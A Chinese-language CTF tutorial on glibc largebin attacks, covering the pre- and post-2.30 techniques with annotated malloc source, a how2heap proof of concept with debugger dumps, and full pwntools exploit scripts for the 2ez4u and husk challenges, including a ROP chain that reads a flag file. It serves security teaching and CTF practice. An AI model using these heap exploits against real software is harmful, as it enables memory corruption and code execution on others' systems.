0x00 前言
=======

说到向任意地址上写一个较大的数值，下意识绝对会想到unsorted bin attack，在一些较低版本的题目中unsorted bin attack是奏效的，但是在glibc-2.29之后，增加了一些保护unsorted bin attack这种利用方法基本上是不能用了。不过可以找到替代的利用方法。就像上一篇文章我们所讲到的Tcache Stashing Unlink Attack，可以实现向任意指定位置写入可控的值。而有一个新的利用方法largebin attack可以任意地址写一个堆地址，这样来看的话不需要leak\_heap\_addr就可以将可控制堆块的地址写入目标地址。

0x01 缅怀过去
=========

感谢unsorted bin attack在glibc-2.29之前为pwn做出的贡献。

还是要简单的说一下unsorted bin attack的利用原理的：Unsorted Bin在使用过程中，采用的遍历顺序是FIFO（先进先出），即挂进链表的时候依次从Unsorted bin的头部向尾部挂，取的时候是从尾部向头部取。在程序malloc时，如果fast bin、small bin中找不到对应大小的chunk，就会尝试从Unsorted bin中寻找chunk。如果取出来的chunk的size刚好满足，则直接交给用户，否则就会把这些chunk分别插入到对应的bin中。结合源码来看

```python
/* remove from unsorted list */
if (__glibc_unlikely (bck->fd != victim))
    malloc_printerr ("malloc(): corrupted unsorted chunks 3");
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

unsortedbin的bk指针指向的是后一个释放的堆块地址，那么如果我们能够控制unsortedbin的bk指针指向一个可写的地址内，就可以向其地址写上一个unsorted bin的地址。

0x02 关于largebin attack的过去
=========================

关于在glibc-2.29之前的largebin attack，是在申请largebin的过程中，伪造largebin的bk\_nextsize，实现非预期内存申请。这种利用的关键在于伪造一个largebin chunk，然后将fake chunk申请出来。

largebin的分配源码是这样的：

可以看到largebin中并不是像其他bin一样存放的都是大小相同的chunk，在largebin中存储的是大小不同的chunk，所以这就应声而出了两个largebin chunk特有的两个字段——fd\_nextsize和bk\_nextsize。largebin中的chunk按照大小排序，fd\_nextsize指向下一个比当前chunk大小小的第一个空闲块，bk\_nextsize指向前一个比当前chunk大小大的第一个空闲chunk，这样的结构有利于程序更好的遍历largebin中的堆块。

```c
/*
         If a large request, scan through the chunks of current bin in
         sorted order to find smallest that fits.  Use the skip list for this.
       */

      if (!in_smallbin_range (nb))
        {
          bin = bin_at (av, idx);

          /* skip scan if empty or largest chunk is too small */
          if ((victim = first (bin)) != bin &&  //获取链表的第一个chunk
              (unsigned long) (victim->size) >= (unsigned long) (nb))
            {
              victim = victim->bk_nextsize;  //反向遍历，chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环
              while (((unsigned long) (size = chunksize (victim)) <
                      (unsigned long) (nb)))
                victim = victim->bk_nextsize;

              /* Avoid removing the first entry for a size so that the skip
                 list does not have to be rerouted.  */
              if (victim != last (bin) && victim->size == victim->fd->size)
                victim = victim->fd;

              remainder_size = size - nb;
              unlink (av, victim, bck, fwd); //large bin的unlink操作

              /* Exhaust */
              if (remainder_size < MINSIZE)
                {
                  set_inuse_bit_at_offset (victim, size);
                  if (av != &main_arena)
                    victim->size |= NON_MAIN_ARENA;
                }
              /* Split */
              else
                {
                  remainder = chunk_at_offset (victim, nb);
                  /* We cannot assume the unsorted list is empty and therefore
                     have to perform a complete insert here.  */
                  bck = unsorted_chunks (av);
                  fwd = bck->fd;
      if (__glibc_unlikely (fwd->bk != bck))
                    {
                      errstr = "malloc(): corrupted unsorted chunks";
                      goto errout;
                    }
                  remainder->bk = bck;
                  remainder->fd = fwd;
                  bck->fd = remainder;
                  fwd->bk = remainder;
                  if (!in_smallbin_range (remainder_size))
                    {
                      remainder->fd_nextsize = NULL;
                      remainder->bk_nextsize = NULL;
                    }
                  set_head (victim, nb | PREV_INUSE |
                            (av != &main_arena ? NON_MAIN_ARENA : 0));
                  set_head (remainder, remainder_size | PREV_INUSE);
                  set_foot (remainder, remainder_size);
                }
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }
```

实例-2017lctf-2ez4u
-----------------

我们主要是了解largebin attack的利用，题目的逆向部分我们简单描述一下：程序保护全开，经典的菜单题目，增查删改一应俱全，free函数里面存在uaf漏洞，在free堆块之后没有将堆块指针清零。

### leak\_heap\_addr

通过释放两个largebin大小的堆块，使他们构成一条largebin的链子，这样的话chunk中的fd\_nextsize与bk\_nextsize会被赋值，再利用UAF打印即可得到堆块地址。

```python
add(0x60,  '0'*0x60 ) # 0
add(0x60,  '1'*0x60 ) # 1
add(0x60,  '2'*0x60 ) # 2
add(0x60,  '3'*0x60 ) # 3
add(0x60,  '4'*0x60 ) # 4
add(0x60,  '5'*0x60 ) # 5
add(0x60,  '6'*0x60 ) # 6
add(0x3f0, '7'*0x3f0) # 7
add(0x30,  '8'*0x30 ) # 8
add(0x3e0, '9'*0x3d0) # 9 
add(0x30,  'a'*0x30 ) # a
add(0x3f0, 'b'*0x3e0) # b 
add(0x30,  'c'*0x30 ) # c
dele(0x9)  ##释放第一个大块
dele(0xb)  ##释放第二个大块
dele(0x0)
gdb.attach(io)
add(0x400, '0'*0x400)  #申请一个较大的块，使得unsorted bin数组清空
# leak
show(0xb)  ##泄露得到堆地址
io.recvuntil('num: ')
print hex(c_uint32(int(io.recvline()[:-1])).value)
io.recvuntil('description:')
HEAP = u64(io.recvline()[:-1]+'\x00\x00')-0x7e0
log.info("heap base 0x%016x" % HEAP)
```

### 伪造largebin chunk

在上一步泄露了heap地址，剩下的前期任务就是要泄露libc。使用的方法就是利用的伪造largebin chunk。不需要将伪造的堆块释放，修改之前被释放堆块的bk\_nextsize字段即可，对应到源代码中代码即`victim = victim->bk_nextsize`，这一点使用UAF即可做到，但想要将该堆块申请出来，还需要绕过unlink的限制，这也可以通过UAF实现。在可以将伪造的堆块申请出来之后，我们可以在伪造的堆块中包含有正常的small bin，这样就可以达到泄露出libc地址以及修改内存的目的。

```python
target_addr = HEAP+0xb0     # 1
chunk1_addr = HEAP+0x130    # 2
chunk2_addr = HEAP+0x1b0    # 3
victim_addr = HEAP+0xc30    # b
# large bin attack
edit(0xb, p64(chunk1_addr))             # victim  ##修改victim = victim->bk_nextsize，伪造堆块开始
edit(0x1, p64(0x0)+p64(chunk1_addr))    # target ##这一步是为了绕过unlink的fd与bk检查
chunk2  = p64(0x0)
chunk2 += p64(0x0)
chunk2 += p64(0x421)
chunk2 += p64(0x0)
chunk2 += p64(0x0)
chunk2 += p64(chunk1_addr)  ##这一步是为了绕过fd_nextsize与bk_nextsize检查
edit(0x3, chunk2) # chunk2
chunk1  = ''
chunk1 += p64(0x0)
chunk1 += p64(0x0)
chunk1 += p64(0x411)
chunk1 += p64(target_addr-0x18)
chunk1 += p64(target_addr-0x10)
chunk1 += p64(victim_addr)
chunk1 += p64(chunk2_addr)  ##伪造的堆块
edit(0x2, chunk1) # chunk1
edit(0x7, '7'*0x198+p64(0x410)+p64(0x411))  ##伪造的堆块后加上结构体。
dele(0x6)
dele(0x3)
add(0x3f0, '3'*0x30+p64(0xdeadbeefdeadbeef)) # chunk1, arbitrary write !!!!!!! ##将伪造的堆块申请出来，从此便可为所欲为。。。
add(0x60,  '6'*0x60 ) # 
show(0x3) ##伪造的堆块中包含small bin，泄露libc地址
io.recvuntil('3'*0x30)
io.recv(8)
LIBC = u64(io.recv(6)+'\x00\x00')-0x3c4be8
log.info("libc base 0x%016x" % LIBC)
```

剩下的就是简单的利用uaf和fastbin attack hijack free\_hook为system。

0x03 关于如今的largebin attack
=========================

在新出的glibc版本中如2.31（目前比赛主流的版本）增加了两个检查使得之前的largebin attack没有办法使用惹

检查一

```python
if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
    malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
```

检查二

```python
if (bck->fd != fwd)
malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
```

凡是需要找个实例
--------

这次还是找到了how2heap的largebin\_attack.c

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b2ec8075fb6c51aea2fae6cc6fcef0ba08baf3b5.png)

代码如下：

```python
#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

/*

A revisit to large bin attack for after glibc2.30

Relevant code snippet :

    if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
        fwd = bck;
        bck = bck->bk;
        victim->fd_nextsize = fwd->fd;
        victim->bk_nextsize = fwd->fd->bk_nextsize;
        fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
    }

*/

int main(){
  /*Disable IO buffering to prevent stream from interfering with heap*/
  setvbuf(stdin,NULL,_IONBF,0);
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  printf("\n\n");
  printf("Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n");
  printf("Check 1 : \n");
  printf(">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
  printf("Check 2 : \n");
  printf(">    if (bck->fd != fwd)\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
  printf("This prevents the traditional large bin attack\n");
  printf("However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n");

  printf("====================================================================\n\n");

  size_t target = 0;
  printf("Here is the target we want to overwrite (%p) : %lu\n\n",&target,target);
  size_t *p1 = malloc(0x428);
  printf("First, we allocate a large chunk [p1] (%p)\n",p1-2);
  size_t *g1 = malloc(0x18);
  printf("And another chunk to prevent consolidate\n");

  printf("\n");

  size_t *p2 = malloc(0x418);
  printf("We also allocate a second large chunk [p2]  (%p).\n",p2-2);
  printf("This chunk should be smaller than [p1] and belong to the same large bin.\n");
  size_t *g2 = malloc(0x18);
  printf("Once again, allocate a guard chunk to prevent consolidate\n");

  printf("\n");

  free(p1);
  printf("Free the larger of the two --> [p1] (%p)\n",p1-2);
  size_t *g3 = malloc(0x438);
  printf("Allocate a chunk larger than [p1] to insert [p1] into large bin\n");

  printf("\n");

  free(p2);
  printf("Free the smaller of the two --> [p2] (%p)\n",p2-2);
  printf("At this point, we have one chunk in large bin [p1] (%p),\n",p1-2);
  printf("               and one chunk in unsorted bin [p2] (%p)\n",p2-2);

  printf("\n");

  p1[3] = (size_t)((&target)-4);
  printf("Now modify the p1->bk_nextsize to [target-0x20] (%p)\n",(&target)-4);

  printf("\n");

  size_t *g4 = malloc(0x438);
  printf("Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n", p2-2, p2-2);
  printf("Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n");
  printf("  the modified p1->bk_nextsize does not trigger any error\n");
  printf("Upon inserting [p2] (%p) into largebin, [p1](%p)->bk_nextsize->fd->nexsize is overwritten to address of [p2] (%p)\n", p2-2, p1-2, p2-2);

  printf("\n");

  printf("In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n", p2-2, (void *)target);
  printf("Target (%p) : %p\n",&target,(size_t*)target);

  printf("\n");
  printf("====================================================================\n\n");

  assert((size_t)(p2-2) == target);

  return 0;
}
```

从此poc调试中去学习一下新型largebin attack的工作过程

首先是程序申请了4个堆块分别为0x428、0x18、0x418、0x18

申请的g1和g2是为了防止两个比较大的堆块合并.

```python
0x55555575a000 PREV_INUSE {
  mchunk_prev size = 0x0,
  mchunksize = 0x291,
  fd = 0x0,
  bk = 0x0,
  fd nextsize = 0x0,
  bk nextsize = 0x0,
}
0x55555575a290 PREV_INUSE {
  mchunk_prev size = 0x0,
  mchunksize = 0x431,
  fd = 0x0,
  bk = 0x0,
  fd nextsize = 0x0,
  bk nextsize = 0x0,
}
0x55555575a6c0  FASTBIN {
  mchunk_prev size = 0x0,
  mchunksize = 0x21,
  fd = 0x0,
  bk = 0x0,
  fd nextsize = 0x0,
  bk nextsize = 0x421,
}
0x55555575a6e0 PREV_INUSE {
  mchunk_prev size = 0x0,
  mchunksize = 0x421,
  fd = 0x0,
  bk = 0x0,
  fd nextsize = 0x0,
  bk nextsize = 0x0,
}
0x55555575ab00 PREV_INUSE {
  mchunk_prev size = 0x0,
  mchunksize = 0x20501,
  fd = 0x0,
  bk = 0x0,
  fd nextsize = 0x0,
  bk nextsize = 0x0,
}
```

再往后释放了p1堆块，到unsorted bin中

```python
unsortedbin
all: 0x55555575a290 -> 0x7ffff7fc1be0 (main arena+96) <- 0x55555575a290
```

之后有分配了一个比p1大的堆块使得p1堆块能够进入largebin中

```python
largebins
0x400: 0x55555575a290 -> 0x7ffff7fc1fd0 (main arena+1104) <- 0x55555575a290
pwndbg>
```

然后程序free p2堆块进入到unsorted bin中

```python
unsortedbin
all: 0x55555575a6e0 -> 0x7ffff7fc1be0 (main_arena+96) <- 0x55555575abe0
smallbins
empty
largebins
0x400: 0x55555575a290 -> 0x7ffff7fc1fd0 (main arena+1104) <- 0x55555575a290
pwndbg>l
```

然后就是修改了p1chunk的bk\_nextsize指向target-0x20

```c
修改前：
0000000000000000  0000000000000431
00007ffff7fc1fd0  00007ffff7fc1fd0
000055555575a290  000055555575a290
0000000000000000  0000000000000000
修改之后：
0000000000000000  0000000000000431
00007ffff7fc1fd0  00007ffff7fc1fd0
000055555575a290  00007fffffffddc0
0000000000000000  0000000000000000
0000000000000000  0000000000000000
```

此时target-0x20的值为0x7fffffffddc0。

下面的这一步就要用到如下的代码了：

```c
if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
    fwd = bck;
    bck = bck->bk;
    victim->fd_nextsize = fwd->fd;
    victim->bk_nextsize = fwd->fd->bk_nextsize;
    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
}
```

程序下一步是malloc了一个比p2还要大的堆块，与p1同理，这个时候p2就会从unsortedbin中放入largebin中。此时就用到了上面的关键代码。victim 是我们的 p2，fwd 为 largebin 的链表头，bck为 largebin 中的最后一个chunk，也就是最小的那个，也就是我们这里的 p1。

取上边代码最关键的三行

```c
    victim->fd_nextsize = fwd->fd;
    victim->bk_nextsize = fwd->fd->bk_nextsize;
    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
```

根据我们分析到的实际问题进行实体性简化：

```c
p2->fd_nextsize = &p1
p2->bk_nextsize = p1->bk_nextsize
p1->bk_nextsize = bk_nextsize->fd_nextsize = victim
```

然后我们是将p1的bk\_nextsize改为了target-0x20，所以就可以得到这样的表识：

```c
p2->fd_nextsize = &p1
p2->bk_nextsize = p1->bk_nextsize
p1->bk_nextsize = (target-0x20)->fd_nextsize = victim
```

其实，这三行置零最重要的是最后一行的`(target-0x20)->fd_nextsize = victim`这就相当于在(target-0x20)+0x20也就是target的地方写下victim也就是p2的地址。

0x04 常见利用方式
===========

这种写大数的行为，我们可以用来修改global\_max\_fast,来使程序中分配的堆块都被识别成fastbin，这样来进行一些可以实现的fastbin attack。再恶劣一点的环境来说，我们可以利用其来进行指针的劫持，劫持为我们可控的地方，在可控的地方为造出原本应有的结构体产生劫持程序流的效果（iofile\_attack:你直接说我名字得了）。

0x05 题目实例
=========

2021湖湘杯2.34的pwn——husk，chunk申请范围是0x40f到0x500，漏洞是uaf

我们利用这个方式就是：通过两次`largebin attack`将已知地址写入结构体指针`tls_dtor_list`和`fs:0x30（tcbhead_t->pointer_guard）`里，然后风水布置堆块，伪造`dtor_list`结构体，接下来就是利用`__call_tls_dtors`函数来调用我们的指针。

一点回顾
----

在系列文章第一篇最后写到了比较方便的gadget去间接控制rdx寄存器就是这里用到了

```c
mov     rdx, [rdi+8]
mov     [rsp+0C8h+var_C8], rax
call    qword ptr [rdx+20h]
```

可以通过这个gadget通过rdi来控制rdx寄存器。

exp：
----

附上网传exp：

```c
#!/usr/bin/env python3
#coding=utf-8
from pwn import*
import os
context.log_level = 'debug'
context.arch='amd64'
binary = './pwn' 
main_arena = 2198624
s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
su = lambda buf,addr:io.success(buf+"==>"+hex(addr))
#context.terminal = ['tilix', '-x', 'sh', '-c']
#context.terminal = ['tilix', 'splitw', '-v']
local = 1
if local == 1:
    io=process(binary)
else:
    io=remote()
elf=ELF(binary)
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(index,size,flag=1):
    pay = b'\x01'
    pay += p8(index)
    pay += p16(size)
    if flag == 1:
        pay += b'\x05'
        ru("Pls input the opcode\n")
        s(pay)
    else:
        return pay

def free(index,flag=1):
    pay = b'\x02'
    pay += p8(index)
    if flag == 1:
        pay += b'\x05'
        ru("Pls input the opcode\n")
        s(pay)
    else:
        return pay

def show(index,flag=1):
    pay = b'\x03'
    pay += p8(index)
    if flag == 1:
        pay += b'\x05'
        ru("Pls input the opcode\n")
        s(pay)
    else:
        return pay

def edit(index,size,content,flag=1):
    pay = b'\x04'
    pay += p8(index)
    pay += p16(size)
    pay += content
    if flag == 1:
        pay += b'\x05'
        ru("Pls input the opcode\n")
        s(pay)
    else:
        return pay

add(0,0x410)#0
add(1,0x460)#1
add(2,0x418)#2
add(3,0x440)#3
add(4,0x410)#4
#---free(1) and show(1)---
pay = free(1,0)
pay += show(1,0)
pay += b'\x05'
ru("Pls input the opcode\n")
s(pay)
#-------------------------
#---------leak------------
libc_base = u64(ru(b'\x7f')[-6:].ljust(0x8,b'\x00')) - main_arena - 96
su('libc_base',libc_base)
pointer_guard_addr = libc_base - 0x2890
tls_dtor_list_addr = libc_base - 0x2918
su('pointer_guard_addr',pointer_guard_addr)
su('tls_dtor_list_addr',tls_dtor_list_addr)
set_context = libc_base + libc.sym['setcontext'] + 61
fh = libc.sym['__free_hook']+libc_base
#0x000000000005dfd1 : mov rax, rdi ; ret 
#0x0000000000169e90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
binsh_addr = libc_base + next(libc.search(b'/bin/sh\0'))
ret = libc_base + libc.sym['setcontext'] + 334
syscall = next(libc.search(asm("syscall\nret")))+libc_base
#---------------------------------------
#------largebin attack and leak heap----
pay = free(3,0)
pay += edit(1,0x20,p64(0)*3+p64(pointer_guard_addr-0x20),0)
pay += add(5,0x500,0)#5
pay += show(1,0)
pay += b'\x05'
ru("Pls input the opcode\n")
s(pay)
ru('Malloc Done\n')
heap = u64(r(6).ljust(8,b'\0')) - 0x2f50
su('heap',heap)
pay = edit(1,0x20,p64(heap+0x2f50)+p64(libc_base+main_arena+1120)+p64(heap+0x2f50)+p64(heap+0x2f50),0)
pay += edit(3,0x20,p64(libc_base+main_arena+1120)+p64(heap+0x26c0)+p64(heap+0x26c0)+p64(heap+0x26c0),0)
pay += b'\x05'
ru("Pls input the opcode\n")
s(pay)
#---------------------------------------
add(1,0x460)#1
add(3,0x440)#3
#------largebin attack ------------------
free(1)
pay = free(3,0)
pay += edit(1,0x20,p64(0)*3+p64(tls_dtor_list_addr-0x20),0)
pay += add(5,0x500,0)#5
pay += show(1,0)
pay += b'\x05'
ru("Pls input the opcode\n")
s(pay)
ru('Malloc Done\n')
heap = u64(r(6).ljust(8,b'\0')) - 0x2f50
su('heap',heap)
pay = edit(1,0x20,p64(heap+0x2f50)+p64(libc_base+main_arena+1120)+p64(heap+0x2f50)+p64(heap+0x2f50),0)
pay += edit(3,0x20,p64(libc_base+main_arena+1120)+p64(heap+0x26c0)+p64(heap+0x26c0)+p64(heap+0x26c0),0)
pay += b'\x05'
ru("Pls input the opcode\n")
s(pay)
#---------------------------------------
#0x0000000000169e90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
#--------------------------------------
pay = add(1,0x460,0)#1
pay+=free(2,0)#0
pay+=add(2,0x430,0)#1
pay += b'\x05'
ru("Pls input the opcode\n")
s(pay)
#--------------------------------------
rop = (0x0000000000169e90+libc_base)^(heap+0x2f50)
rop = ((rop>>(64-0x11))|(rop<<0x11))
pay = b''.ljust(0x410,b's')+p64(rop)+p64(heap+0x26d0)
edit(2,len(pay),pay)
gdb.attach(io)
payload = p64(0)+p64(heap+0x26d0)+p64(0)+p64(0)+p64(set_context)
payload = payload.ljust(0x70,b'\0')+p64(fh&0xfffffffffffff000)#rsi
payload = payload.ljust(0x68,b'\0')+p64(0)#rdi
payload = payload.ljust(0x88,b'\0')+p64(0x2000)#rdx
payload = payload.ljust(0xa0,b'\0')+p64((fh&0xfffffffffffff000)+8)#bytes(frame)
payload = payload.ljust(0xa0,b'\0')+p64(syscall)#rip
edit(1,len(payload),payload)#make rdx = chunk3
add(1,0x550)
ru(b'ERROR\n')
pop_rdx_r12_ret = 0x0000000000122431+libc_base
layout = [next(libc.search(asm('pop rdi\nret')))+libc_base
    ,fh&0xfffffffffffff000
    ,next(libc.search(asm('pop rsi\nret')))+libc_base
    ,0
    ,p64(pop_rdx_r12_ret)
    ,p64(0)
    ,p64(0)
    ,next(libc.search(asm('pop rax\nret')))+libc_base
    ,2
    ,syscall
    ,next(libc.search(asm('pop rdi\nret')))+libc_base
    ,3
    ,next(libc.search(asm('pop rsi\nret')))+libc_base
    ,(fh&0xfffffffffffff000)+0x200
    ,p64(pop_rdx_r12_ret)
    ,p64(0x30)
    ,p64(0)
    ,next(libc.search(asm('pop rax\nret')))+libc_base
    ,0
    ,syscall
    ,next(libc.search(asm('pop rdi\nret')))+libc_base
    ,1
    ,next(libc.search(asm('pop rsi\nret')))+libc_base
    ,(fh&0xfffffffffffff000)+0x200
    ,p64(pop_rdx_r12_ret)
    ,p64(0x30)
    ,p64(0)
    ,next(libc.search(asm('pop rax\nret')))+libc_base
    ,1
    ,syscall]
shellcode=b'./flag'.ljust(8,b'\x00')+flat(layout)
gdb.attach(proc.pidof(io)[0])
s(shellcode)
shell()
```

0x06 后记
=======

我认为在这么卷的时代，这种新的利用方式将成为之后的主流攻击方式。

0x07 参考链接
=========

[(11条消息) glibc-2.29 large bin attack 原理\_TUANZI\_Dum的博客-CSDN博客](https://blog.csdn.net/qq_23066945/article/details/103070322)

[(11条消息) 好好说话之Unsorted Bin Attack\_hollk的博客-CSDN博客](https://blog.csdn.net/qq_41202237/article/details/112589899)

[Largebin Attack for Glibc 2.31 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/244018)